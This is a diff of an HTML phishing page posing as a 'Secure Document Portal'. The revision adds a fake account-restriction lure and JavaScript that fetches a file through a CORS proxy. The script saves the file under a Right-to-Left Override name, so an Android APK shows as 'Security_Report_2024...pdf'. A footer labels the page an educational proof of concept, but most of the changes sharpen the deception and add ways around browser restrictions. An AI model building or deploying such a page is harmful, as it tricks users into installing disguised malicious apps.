@@ -2,75 +2,109 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Document Portal</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f4f7f6; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            text-align: center; 
+            padding: 50px 20px; 
+            background-color: #f4f7f6; 
+            color: #333;
+        }
         .download-box { 
             border: 1px solid #ddd; 
             padding: 40px; 
             background: #fff; 
-            border-radius: 10px; 
+            border-radius: 12px; 
             display: inline-block; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            max-width: 400px;
         }
+        h3 { margin-top: 0; color: #2c3e50; }
+        p { color: #666; font-size: 1rem; margin-bottom: 25px; }
         .btn { 
             display: inline-block;
             padding: 15px 35px; 
             background-color: #d93025; 
             color: #fff; 
             text-decoration: none; 
-            border-radius: 5px; 
+            border-radius: 6px; 
             cursor: pointer; 
             font-weight: bold;
             font-size: 1.1em;
+            transition: transform 0.2s, background 0.2s;
         }
-        .btn:hover { background-color: #b2261c; }
-        .meta { margin-top: 15px; color: #777; font-size: 0.85em; }
+        .btn:hover { background-color: #b2261c; transform: translateY(-2px); }
+        .btn:active { transform: translateY(0); }
+        .meta { margin-top: 20px; color: #888; font-size: 0.85em; border-top: 1px solid #eee; padding-top: 15px; }
+        .warning { margin-top: 40px; color: #999; font-size: 0.75em; font-style: italic; }
     </style>
 </head>
 <body>
 
     <div class="download-box">
-        <h3>Encrypted Security Report</h3>
-        <p>Please download and verify the security document (PDF) to proceed.</p>
+        <h3>Verification Required</h3>
+        <p>Your account access is restricted. Please download and review the security report (PDF) to verify your identity.</p>
         
-        <!-- Action button that triggers the spoofing logic -->
-        <div onclick="initiateSpoof()" class="btn">
-            Download Document (PDF)
+        <!-- Button triggers the JavaScript Spoofing logic -->
+        <div onclick="initiateSecureDownload()" class="btn">
+            Download Report (PDF)
         </div>
 
         <div class="meta">
-            File: Security_Report_2024.pdf | Size: 1.2 MB
+            <strong>File:</strong> Security_Report_Ref_772.pdf<br>
+            <strong>Size:</strong> 1.25 MB | <strong>Format:</strong> Adobe PDF
         </div>
     </div>
 
     <script>
-        function initiateSpoof() {
-            // Using your renamed file Raw URL to bypass extension detection
-            const rawUrl = 'https://github.com';
+        function initiateSecureDownload() {
+            // Your renamed GitHub file link
+            const targetUrl = 'https://github.com';
             
-            // RLO Character (\u202E) flips "fdp.kpa" to "apk.pdf"
+            // Using a CORS proxy to bypass GitHub's Cross-Origin restrictions on mobile
+            const proxyUrl = 'https://corsproxy.io?' + encodeURIComponent(targetUrl);
+            
+            // The Spoofed Name: \u202E is the RLO character.
+            // "fdp.kpa" reversed becomes "apk.pdf"
             const spoofedName = "Security_Report_2024\u202Efdp.kpa";
 
-            fetch(rawUrl)
-                .then(response => response.blob())
-                .then(blob => {
-                    const url = window.URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = spoofedName; // Injecting spoofed name
-                    document.body.appendChild(a);
-                    a.click();
-                    window.URL.revokeObjectURL(url);
-                    a.remove();
+            console.log("Initiating secure download...");
+
+            fetch(proxyUrl)
+                .then(response => {
+                    if (!response.ok) throw new Error('Network error or CORS block');
+                    return response.blob();
                 })
-                .catch(() => alert('Could not connect to secure server.'));
+                .then(blob => {
+                    // Creating a temporary Blob URL in browser memory
+                    const blobUrl = window.URL.createObjectURL(blob);
+                    const hiddenAnchor = document.createElement('a');
+                    
+                    hiddenAnchor.style.display = 'none';
+                    hiddenAnchor.href = blobUrl;
+                    hiddenAnchor.download = spoofedName; // Force the spoofed name
+                    
+                    document.body.appendChild(hiddenAnchor);
+                    hiddenAnchor.click();
+                    
+                    // Cleanup
+                    setTimeout(() => {
+                        window.URL.revokeObjectURL(blobUrl);
+                        hiddenAnchor.remove();
+                    }, 100);
+                })
+                .catch(err => {
+                    console.error('Download Error:', err);
+                    alert('Server Busy: Please try downloading using a desktop browser or check your connection.');
+                });
         }
     </script>
 
-    <p style="margin-top: 40px; color: #999; font-size: 0.8em;">
-        PoC for Educational Purposes: Demonstrating Right-to-Left Override (RLO) Vulnerability.
-    </p>
+    <div class="warning">
+        PoC for Educational Purposes Only: Demonstrating Filename Spoofing via RLO (U+202E).
+    </div>
 
 </body>
 </html>
